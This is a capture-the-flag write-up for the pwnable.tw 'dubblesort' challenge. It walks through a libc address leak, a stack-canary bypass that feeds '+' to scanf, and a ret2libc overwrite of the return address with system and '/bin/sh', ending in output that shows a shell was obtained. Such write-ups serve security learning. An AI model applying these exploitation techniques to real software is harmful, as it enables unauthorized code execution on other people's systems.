# Dubblesort
Okay this was by far the most frustrating challenge yet. So many issues that took way too long to fix. Nevertheless, it's solved and here's how it's done.

Start out by checking the security on the binary:
```
pwn checksec ./dubblesort
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

Yikes. Alright looks like there's gonna be a very specific bug here. Lets test out the program to see what happens:

```
What your name :a
Hello a
��,How many numbers do you what to sort :2
Enter the 0 number : 1
Enter the 1 number : 2
Processing......
Result :
1 2
```

Hmmm. Looks like there's some weird stuff going on when it asks for your name. After a look in GDB, looks like it's just printing out whatever is on the stack. There's some random values there to look at:

```
pwndbg> x/20x 0xffffda3c <- Location of name on the stack
0xffffda3c:     0x000040d7      0xffffdc69      0x0000002f      0x0000009e
0xffffda4c:     0x00000016      0x00008000      0xf7fcf000      0xf7fcd244
```

Woah that 7th value is interesting... After a check in vmmap I can see it's the GOT of libc. This means if we leak this, there is a chance of a ret2libc attack. Alright lets try it to see what we get. I need to input 25 "A"s and I should be able to leak that value. The reason it has to be 25 and not 24 is because the printf call will stop the print at the null value in the address (e.g `0xf7fcf000`) the first character `\x00` will stop the printf before it prints the rest of the address. So we can overwrite that last value and it should print the whole thing like this: `0xf7fcf041` in this case: `0x41` is the hex value of "A" which will be printed to the screen along with the rest of the address. After this leak, we now can calculate the base of libc.

Okay have a libc leak. How can we utilize this to our advantage. My first though was hey maybe if I buffer overflow the part where it asks me for the number I'd like to sort maybe I can overwrite the return address on the stack. Welp:

```
What your name :A
Hello A
��,How many numbers do you what to sort :1
Enter the 0 number : 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Processing......
Result :
4294967295
```

Okay looks like it converts my number directly into a %u unsigned integer

```
 0x56555a95 <main+210>    call   __isoc99_scanf@plt
        format: 0x56555bfa ◂— 0x45007525 /* '%u' */
        vararg: 0xffffda4c —▸ 0xf7ffc7e0
```

Yep.

Okay what if we figure out a way to exploit the sorting function. Maybe there's some weird stuff with the sorting function that would cause some funkiness in the program. Lets try it:

```
What your name :a
Hello a
��,How many numbers do you what to sort :25
Enter the 0 number : 1
Enter the 1 number : 1
Enter the 2 number : 1
Enter the 3 number : 1
Enter the 4 number : 1
Enter the 5 number : 1
Enter the 6 number : 1
Enter the 7 number : 1
Enter the 8 number : 1
Enter the 9 number : 1
Enter the 10 number : 1
Enter the 11 number : 1
Enter the 12 number : 1
Enter the 13 number : 1
Enter the 14 number : 1
Enter the 15 number : 1
Enter the 16 number : 1
Enter the 17 number : 1
Enter the 18 number : 1
Enter the 19 number : 1
Enter the 20 number : 1
Enter the 21 number : 1
Enter the 22 number : 1
Enter the 23 number : 1
Enter the 24 number : 1
Processing......
1Result :
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 *** stack smashing detected ***: terminated
```

OOOH we got a stack smash. HUH??? What's going on. I took a look at our input in GDB to see what I could make of it:
Before input:

```
pwndbg> x/30x 0xffffda4c
0xffffda4c:     0xf7ffc7e0      0x00000000      0x00000000      0x00005034
0xffffda5c:     0x5998aa00      0x029c6fbf      0x00000534      0x0000009e
0xffffda6c:     0xf7fb0a61      0x00000000      0xf7fba000      0xf7ffc7e0
0xffffda7c:     0xf7fbdc68      0xf7fba000      0xf7fe22f0      0x00000000
0xffffda8c:     0x56555601      0x565557a9      0x56556fa0      0x00000001
0xffffda9c:     0x56555b72      0x00000001      0xffffdb64      0xffffdb6c
0xffffdaac:     0x5998aa00 <- Stack Canary
```
After input:
```
0xffffda4c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffda5c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffda6c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffda7c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffda8c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffda9c:     0x00000001      0x00000001      0x00000001      0x00000001
0xffffdaac:     0x00000001 <- Was stack canary
```

Okay we overwrote the stack canary. That sucks, but that means if we can do that, we can overwrite the return address. The only problem is the stack canary will always be in the way. If only there was a way to skip over the canary... Well if I try to enter a letter "L" into the input at any point. It crashes the scanf function and it doesn't read anything else. This was the method I started with, but soon found out a much better solution. If you enter the "+" symbol instead of the number, it won't crash the scanf function, but it also won't overwrite whatever is in memory at that spot. So If I do this at the stack canary it will prevent it from being overwritten. There's one more obstacle in this: Whatever I enter needs to be in ascending order. This is a sorting function right?

Alright so looks like I have all the information I need now to complete the exploit. I start out with a leak in libc. Then I enter an ascending stack with a "+" at the 25th spot and then All the values afterward need to be larger than the stack canary. This would allow me to overwrite the return address and change the control flow of the program. The inputs would look a little like this:

```
"1" * 24
"+" 
"<addr_system>" * 9 <-- 9th value overwrites return addr
"<addr_binsh>"
```

Since I have the address of libc, I can calculate all the offsets to get the address of system and the string "/bin/sh". When the program returns it will call `system("/bin/sh")` And there's our shell. 

```
[b'Hello', b'AAAAAAAAAAAAAAAAAAAAAAAAAPm\xf7D2m\xf7\x01\xf6YV\xa9\xf7YV\xa0\x0fZV\x01', b'How', b'many', b'numbers', b'do', b'you', b'what', b'to', b'sort', b':']
./e.py:34: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(length))
./e.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(system))
./e.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(binsh))
Processing......
Result :
4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 2294056704 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4150779531 $ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

For more details on the actual exploit script take a look at `e.py` in the repo.

### Issues
I thought I'd add an issues section for this challenge because I didn't necessarily have much trouble with the exploit, but I had a lot of problems with the setup of the program. 

This is the first program on pwnable.tw that I've done that offers a download of the libc that is supposed to be used in the program. What they didn't include was a copy of the ld.so for the program. This means that the program will run on your personal libc and the exploit will not actually be the same as the remote one. 

The way to get around this is to patch the elf to use the libc that they give you. I found a super nice tool called [pwninit](https://github.com/io12/pwninit) That you can use to patch the ELF automatically. It's like magic. Just hop into the directory with the libc and the binary you want to patch and run `pwninit` and it will find the necessary files and patch the ELF. This was essential to solving the problem. Without this, I would not have been able to run the binary in gdb and find the proper offsets.

